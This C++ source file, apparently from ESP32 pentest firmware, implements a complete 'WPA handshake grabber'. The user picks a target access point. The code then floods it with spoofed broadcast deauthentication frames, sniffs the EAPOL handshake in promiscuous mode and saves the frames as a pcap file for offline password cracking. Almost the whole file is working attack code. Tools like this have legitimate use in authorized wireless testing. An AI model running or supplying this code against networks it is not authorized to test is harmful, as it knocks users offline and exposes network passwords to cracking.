#if !LITE_VERSION
#include "arsenal.h"
#include "arsenal_background.h"
#include "arsenal_config.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

#define EAPOL_RING_SIZE 64
#define PCAP_GLOBAL_HDR_LEN 24
#define PCAP_PKT_HDR_LEN 16

struct EapolEntry {
    uint8_t *data;
    uint16_t len;
    bool used;
};

static EapolEntry eapolRing[EAPOL_RING_SIZE];
static int eapolIdx = 0;
static bool eapolCaptureActive = false;
static int eapolCount = 0;
static uint8_t targetBSSID[6];
static uint8_t targetChannel = 1;

static bool macEq(const uint8_t *a, const uint8_t *b) {
    for (int i = 0; i < 6; i++) if (a[i] != b[i]) return false;
    return true;
}

static bool isEapolFrame(const uint8_t *frame, int len) {
    if (len < 24) return false;
    uint8_t type = (frame[0] >> 2) & 0x03;
    if (type != 0x02) return false;

    uint8_t subtype = (frame[0] >> 4) & 0x0F;
    int bodyStart = 24;
    if (subtype == 0x08 || subtype == 0x0C) bodyStart = 26;

    if (len < bodyStart + 8) return false;
    if (frame[bodyStart] == 0xAA && frame[bodyStart + 1] == 0xAA && frame[bodyStart + 2] == 0x03) {
        if (frame[bodyStart + 6] == 0x88 && frame[bodyStart + 7] == 0x8E) return true;
    }
    return false;
}

static void eapolPromiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!eapolCaptureActive) return;
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (!isEapolFrame(frame, len)) return;

    const uint8_t *bssid1 = frame + 16;
    const uint8_t *bssid2 = frame + 10;
    bool match = false;
    if (macEq(bssid1, targetBSSID)) match = true;
    if (macEq(bssid2, targetBSSID)) match = true;
    if (!match) return;

    uint8_t *copy = (uint8_t *)malloc(len);
    if (!copy) return;
    memcpy(copy, frame, len);

    if (eapolRing[eapolIdx].used) {
        free(eapolRing[eapolIdx].data);
    }
    eapolRing[eapolIdx].data = copy;
    eapolRing[eapolIdx].len = (uint16_t)len;
    eapolRing[eapolIdx].used = true;
    eapolIdx = (eapolIdx + 1) % EAPOL_RING_SIZE;
    eapolCount++;
}

static void writePcap(const char *path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) return;

    uint8_t ghdr[PCAP_GLOBAL_HDR_LEN];
    memset(ghdr, 0, sizeof(ghdr));
    ghdr[0] = 0xD4; ghdr[1] = 0xC3; ghdr[2] = 0xB2; ghdr[3] = 0xA1;
    ghdr[4] = 0x02; ghdr[5] = 0x00;
    ghdr[6] = 0x04; ghdr[7] = 0x00;
    ghdr[16] = 0xFF; ghdr[17] = 0xFF; ghdr[18] = 0x00; ghdr[19] = 0x00;
    ghdr[20] = 0x69; ghdr[21] = 0x00;
    f.write(ghdr, PCAP_GLOBAL_HDR_LEN);

    for (int i = 0; i < EAPOL_RING_SIZE; i++) {
        int idx = (eapolIdx + i) % EAPOL_RING_SIZE;
        if (!eapolRing[idx].used) continue;

        uint8_t phdr[PCAP_PKT_HDR_LEN];
        memset(phdr, 0, sizeof(phdr));
        uint32_t ts = millis() / 1000;
        uint32_t tsUs = (millis() % 1000) * 1000;
        memcpy(phdr + 0, &ts, 4);
        memcpy(phdr + 4, &tsUs, 4);
        uint32_t inclLen = eapolRing[idx].len;
        uint32_t origLen = inclLen;
        memcpy(phdr + 8, &inclLen, 4);
        memcpy(phdr + 12, &origLen, 4);

        f.write(phdr, PCAP_PKT_HDR_LEN);
        f.write(eapolRing[idx].data, eapolRing[idx].len);
    }

    f.close();
}

void arsenal_wpa_handshake_grabber(void) {
    ARSENAL_HEAP_CHECK();
    if (!setupSdCard()) {
        displayRedStripe("SD card required");
        delay(1500);
        return;
    }
    if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
    if (!SD.exists("/arsenal/handshakes")) SD.mkdir("/arsenal/handshakes");

    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);

    int n = WiFi.scanNetworks(false, true);
    if (n == 0) {
        displayRedStripe("No networks found");
        delay(1500);
        return;
    }

    options.clear();
    for (int i = 0; i < n && i < 15; i++) {
        uint8_t *bssid = WiFi.BSSID(i);
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        String enc = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? " " : "*";
        String label = enc + WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB) " + bssidStr;
        options.push_back({label, [i]() {}});
    }
    int targetIdx = -1;
    for (int i = 0; i < n && i < 15; i++) {
        options[i].operation = [i, &targetIdx]() { targetIdx = i; };
    }
    loopOptions(options, MENU_TYPE_SUBMENU, "Target AP (WPA)");

    if (targetIdx < 0) return;

    memcpy(targetBSSID, WiFi.BSSID(targetIdx), 6);
    targetChannel = WiFi.channel(targetIdx);
    String targetSSID = WiFi.SSID(targetIdx);
    WiFi.scanDelete();

    memset(eapolRing, 0, sizeof(eapolRing));
    eapolIdx = 0;
    eapolCount = 0;

    bool bgWasRunning = arsenal_background_is_running();
    if (bgWasRunning) arsenal_background_stop();

    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(eapolPromiscCb);
    eapolCaptureActive = true;

    uint8_t deauthFrame[26];
    memset(deauthFrame, 0, sizeof(deauthFrame));
    deauthFrame[0] = 0xC0;
    deauthFrame[1] = 0x00;
    uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(deauthFrame + 4, broadcastAddr, 6);
    memcpy(deauthFrame + 10, targetBSSID, 6);
    memcpy(deauthFrame + 16, targetBSSID, 6);
    deauthFrame[24] = 0x07;
    deauthFrame[25] = 0x00;

    unsigned long startTime = millis();
    unsigned long lastDeauth = 0;
    unsigned long lastDisplay = 0;

    while (true) {
        unsigned long now = millis();

        if (now - lastDeauth > 3000) {
            for (int i = 0; i < 15; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
            }
            lastDeauth = now;
        }

        if (now - lastDisplay > 300) {
            lastDisplay = now;
            drawMainBorderWithTitle("WPA Grabber");
            int y = 40;
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(12, y);
            tft.printf("AP: %s", targetSSID.c_str());
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Ch: %d  BSSID: %02X:%02X:%02X", targetChannel, targetBSSID[0], targetBSSID[1], targetBSSID[2]);
            y += 14;
            tft.setCursor(12, y);
            tft.printf("EAPOLs captured: %d", eapolCount);
            y += 14;
            unsigned long elapsed = (now - startTime) / 1000;
            tft.setCursor(12, y);
            tft.printf("Time: %lus", elapsed);
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Deauths: %d", (int)((now - startTime) / 3000));
            y += 14;
            if (eapolCount >= 4) {
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                tft.print("Handshake likely captured!");
            } else {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                tft.printf("Need 4+ EAPOLs (have %d)", eapolCount);
            }
            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc:stop & save"), tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) break;
        esp_task_wdt_reset();
        delay(50);
    }

    eapolCaptureActive = false;
    esp_wifi_set_promiscuous(false);

    if (eapolCount > 0) {
        char path[48];
        snprintf(path, sizeof(path), "/arsenal/handshakes/%02X%02X%02X.pcap",
            targetBSSID[3], targetBSSID[4], targetBSSID[5]);
        writePcap(path);

        drawMainBorderWithTitle("WPA Grabber");
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, 50);
        tft.printf("Saved %d EAPOL frames", eapolCount);
        tft.setCursor(12, 66);
        tft.printf("Path: %s", path);
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString(String("Press any key"), tftWidth / 2, tftHeight - 20, 1);
        while (!check(EscPress) && !check(SelPress)) delay(100);
    } else {
        displayRedStripe("No EAPOL frames captured");
        delay(1500);
    }

    for (int i = 0; i < EAPOL_RING_SIZE; i++) {
        if (eapolRing[i].used && eapolRing[i].data) free(eapolRing[i].data);
    }

    if (bgWasRunning) arsenal_background_start();
}
#endif
